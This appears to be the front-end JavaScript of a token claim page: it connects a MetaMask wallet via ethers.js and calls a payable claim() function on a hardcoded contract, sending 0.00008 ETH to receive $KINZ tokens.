
const connectButton = document.getElementById("connectButton");
const claimButton = document.getElementById("claimButton");
const walletAddressSpan = document.getElementById("walletAddress");
const statusMessage = document.getElementById("statusMessage");

const claimContractAddress = "0x4605b784a20Bab247b18AC4D75F4E723245Be180";
const claimABI = [
  "function claim() public payable"
];

let provider, signer, claimContract;

connectButton.onclick = async () => {
  if (typeof window.ethereum === 'undefined') {
    alert("Please install MetaMask.");
    return;
  }

  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    const address = await signer.getAddress();
    walletAddressSpan.textContent = address;

    claimContract = new ethers.Contract(claimContractAddress, claimABI, signer);
    claimButton.disabled = false;
    statusMessage.textContent = "✅ Wallet connected. Ready to claim.";
  } catch (err) {
    console.error(err);
    statusMessage.textContent = "❌ Failed to connect wallet.";
  }
};

claimButton.onclick = async () => {
  if (!claimContract) return;
  try {
    const tx = await claimContract.claim({ value: ethers.utils.parseEther("0.00008") });
    statusMessage.textContent = "⏳ Claiming in progress...";
    await tx.wait();
    statusMessage.textContent = "🎉 Claim successful! You received your $KINZ.";
    claimButton.disabled = true;
  } catch (err) {
    console.error(err);
    statusMessage.textContent = "❌ Claim failed. Possibly already claimed.";
  }
};
